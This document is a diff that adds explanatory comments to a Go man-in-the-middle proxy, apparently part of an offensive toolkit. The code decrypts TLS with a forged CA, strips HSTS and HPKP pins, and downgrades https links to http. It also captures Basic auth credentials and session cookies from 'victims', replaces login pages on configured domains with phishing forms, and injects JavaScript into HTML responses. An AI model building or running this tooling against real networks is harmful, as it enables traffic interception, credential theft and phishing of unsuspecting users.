@@ -29,6 +29,8 @@ import (
 )
 
 // MaxBody is the largest response body the proxy will buffer for rewriting.
+// Buffering is needed to swap login pages and inject JS; bodies larger than
+// this are passed through untouched.
 const MaxBody = 2 << 20
 
 // Config configures the MITM proxy.
@@ -64,9 +66,9 @@ type MITMProxy struct {
 	srv *http.Server
 	ln  net.Listener
 
-	requests atomic.Int64
-	harvest  atomic.Int64
-	swaps    atomic.Int64
+	requests atomic.Int64 // requests handled
+	harvest  atomic.Int64 // credentials/sessions captured
+	swaps    atomic.Int64 // login pages swapped
 	mu       sync.Mutex
 }
 
@@ -81,8 +83,12 @@ func New(cfg Config) *MITMProxy {
 	p := &MITMProxy{cfg: cfg}
 	p.gop = goproxy.NewProxyHttpServer()
 	p.gop.Verbose = false
+	// Route goproxy's own diagnostics through slog at warn level so the
+	// noisy proxy internals do not spam the application log.
 	p.gop.Logger = slog.NewLogLogger(slog.Default().Handler(), slog.LevelWarn)
 
+	// Default: pass CONNECT tunnels through untouched. With a CA we instead
+	// terminate TLS ourselves and decrypt the traffic.
 	connectAction := &goproxy.ConnectAction{Action: goproxy.ConnectAccept}
 	if cfg.CA != nil {
 		tlsCA := &tls.Certificate{Certificate: [][]byte{cfg.CA.Cert.Raw}, PrivateKey: cfg.CA.Key}
@@ -126,7 +132,8 @@ func (p *MITMProxy) Addr() string {
 	return p.ln.Addr().String()
 }
 
-// Stop shuts the server down and closes the listener.
+// Stop shuts the server down and closes the listener. It uses a bounded
+// shutdown context so hanging connections cannot block Stop forever.
 func (p *MITMProxy) Stop() {
 	if p.srv != nil {
 		ctx, cancel := context.WithTimeout(context.Background(), 2*time.Second)
@@ -147,6 +154,7 @@ func (p *MITMProxy) TLSEnabled() bool { return p.cfg.CA != nil }
 // Harvests returns the number of captured credentials/sessions.
 func (p *MITMProxy) Harvests() int64 { return p.harvest.Load() }
 
+// victimIP extracts the client's IP (without port) from RemoteAddr.
 func (p *MITMProxy) victimIP(r *http.Request) string {
 	host, _, err := net.SplitHostPort(r.RemoteAddr)
 	if err != nil {
@@ -155,10 +163,13 @@ func (p *MITMProxy) victimIP(r *http.Request) string {
 	return host
 }
 
+// onRequest is the request hook: applies injections, harvests Basic auth and
+// logs the traffic. Returning (r, nil) forwards the request unchanged.
 func (p *MITMProxy) onRequest(r *http.Request, ctx *goproxy.ProxyCtx) (*http.Request, *http.Response) {
 	p.requests.Add(1)
 	victim := p.victimIP(r)
 
+	// Inject tracking/session cookies and headers into the victim's request.
 	if p.cfg.Injector != nil {
 		p.cfg.Injector.Apply(victim, r.URL.Host, func(name, value string) {
 			c := &http.Cookie{Name: name, Value: value, Path: "/"}
@@ -168,6 +179,8 @@ func (p *MITMProxy) onRequest(r *http.Request, ctx *goproxy.ProxyCtx) (*http.Req
 		})
 	}
 
+	// Basic auth credentials arrive as "Basic <base64(user:pass)>"; the raw
+	// header value is stored (decoding is left to the analyst) and flagged.
 	if h := r.Header.Get("Authorization"); strings.HasPrefix(h, "Basic ") {
 		p.harvest.Add(1)
 		if p.cfg.DB != nil {
@@ -185,11 +198,14 @@ func (p *MITMProxy) onRequest(r *http.Request, ctx *goproxy.ProxyCtx) (*http.Req
 	}
 
 	if p.cfg.Log != nil {
+		// ctx.Resp == nil indicates this is a plain (un-MITM'd) request.
 		p.cfg.Log.Info("proxy request", "method", r.Method, "url", r.URL.String(), "victim", victim, "tls", ctx.Resp == nil && r.URL.Scheme == "https")
 	}
 	return r, nil
 }
 
+// onResponse is the response hook: captures Set-Cookie sessions, applies
+// sslstrip and rewrites HTML bodies (phishing swap or JS injection).
 func (p *MITMProxy) onResponse(resp *http.Response, ctx *goproxy.ProxyCtx) *http.Response {
 	if resp == nil {
 		return nil
@@ -201,7 +217,9 @@ func (p *MITMProxy) onResponse(resp *http.Response, ctx *goproxy.ProxyCtx) *http
 		p.stripHSTS(resp, ctx.Req)
 	}
 
+	// Only HTML bodies are rewritten; everything else is streamed through.
 	if contentTypeIsHTML(resp) {
+		// Read the whole body (bounded by MaxBody) so it can be rewritten.
 		body, err := io.ReadAll(io.LimitReader(resp.Body, MaxBody))
 		resp.Body.Close()
 		if err != nil {
@@ -210,10 +228,14 @@ func (p *MITMProxy) onResponse(resp *http.Response, ctx *goproxy.ProxyCtx) *http
 		if p.cfg.SSLStrip {
 			body = rewriteHTTPSLinks(body, resp)
 		}
+		// Phishing swap takes priority; otherwise inject JS if configured and
+		// the body actually fits (a truncated body cannot be spliced safely).
 		body, replaced := p.maybeSwapForm(ctx.Req, resp, body, victim)
 		if !replaced && p.cfg.InjectedJS != "" && len(body) < MaxBody {
 			body = injectJS(body, []byte(p.cfg.InjectedJS))
 		}
+		// Replace the streamed body with the rewritten bytes and fix up the
+		// length metadata so the client trusts the new Content-Length.
 		resp.Body = io.NopCloser(bytes.NewReader(body))
 		resp.ContentLength = int64(len(body))
 		resp.Header.Set("Content-Length", fmt.Sprintf("%d", len(body)))
@@ -223,7 +245,8 @@ func (p *MITMProxy) onResponse(resp *http.Response, ctx *goproxy.ProxyCtx) *http
 
 // stripHSTS removes Strict-Transport-Security headers and rewrites Location
 // redirects from https:// to http:// so the browser never learns about HSTS
-// (sslstrip's core mechanic).
+// (sslstrip's core mechanic). HPKP pin headers are removed too so pinned
+// sites do not reject our forged certificates.
 func (p *MITMProxy) stripHSTS(resp *http.Response, req *http.Request) {
 	if loc := resp.Header.Get("Location"); strings.HasPrefix(strings.ToLower(loc), "https://") {
 		resp.Header.Set("Location", "http://"+loc[len("https://"):])
@@ -235,7 +258,9 @@ func (p *MITMProxy) stripHSTS(resp *http.Response, req *http.Request) {
 }
 
 // rewriteHTTPSLinks rewrites https:// absolute URLs inside an HTML body to
-// http:// so the victim's browser keeps using the clear-text proxy.
+// http:// so the victim's browser keeps using the clear-text proxy. If the
+// body actually changed, any Content-Encoding must be dropped because the
+// compressed stream is now invalid.
 func rewriteHTTPSLinks(body []byte, resp *http.Response) []byte {
 	out := httpsURLRE.ReplaceAll(body, []byte("http://"))
 	if !bytes.Equal(out, body) {
@@ -273,6 +298,7 @@ func (p *MITMProxy) maybeSwapForm(req *http.Request, resp *http.Response, body [
 	if len(p.cfg.PhishDomains) == 0 {
 		return body, false
 	}
+	// Only hosts explicitly configured for phishing are swapped.
 	id, ok := p.cfg.PhishDomains[strings.ToLower(req.URL.Hostname())]
 	if !ok {
 		return body, false
@@ -285,6 +311,8 @@ func (p *MITMProxy) maybeSwapForm(req *http.Request, resp *http.Response, body [
 	if p.cfg.Log != nil {
 		p.cfg.Log.Info("form swapped", "brand", id, "url", req.URL.String(), "victim", victim)
 	}
+	// The replacement is fresh HTML: force the content type and drop any
+	// encoding/ETag so caches cannot serve the stale original.
 	resp.Header.Set("Content-Type", "text/html; charset=utf-8")
 	resp.Header.Del("Content-Encoding")
 	resp.Header.Del("ETag")
@@ -300,11 +328,16 @@ func renderSwapped(id, captureBase, orig string) (string, error) {
 	if captureBase == "" {
 		captureBase = "/"
 	}
+	// The swapped form posts to <captureBase>/phish/<id>/submit; the capture
+	// server then redirects the victim back to the original page (orig).
 	f.Action = strings.TrimRight(captureBase, "/") + "/phish/" + id + "/submit"
 	f.Orig = orig
 	return phish.Render(id, f)
 }
 
+// contentTypeIsHTML reports whether the response should be treated as HTML.
+// An absent Content-Type is treated as HTML (best-effort for misconfigured
+// servers); otherwise the media type must match an HTML family.
 func contentTypeIsHTML(resp *http.Response) bool {
 	if resp == nil {
 		return false
@@ -316,9 +349,13 @@ func contentTypeIsHTML(resp *http.Response) bool {
 	return htmlTypeRE.MatchString(ct)
 }
 
+// injectJS splices the snippet into the HTML body right after <head> or
+// before </head>, so it runs before the page's own scripts render.
 func injectJS(body, snippet []byte) []byte {
+	// Prefer the closing </head> tag; splice immediately before it.
 	idx := bytes.Index(body, []byte("</head>"))
 	if idx < 0 {
+		// Fall back to right after an opening <head> tag.
 		idx = bytes.Index(body, []byte("<head>"))
 		if idx >= 0 {
 			idx += len("<head>")
@@ -328,6 +365,7 @@ func injectJS(body, snippet []byte) []byte {
 			out = append(out, body[idx:]...)
 			return out
 		}
+		// No head tag at all: leave the body untouched.
 		return body
 	}
 	out := make([]byte, 0, len(body)+len(snippet)+8)
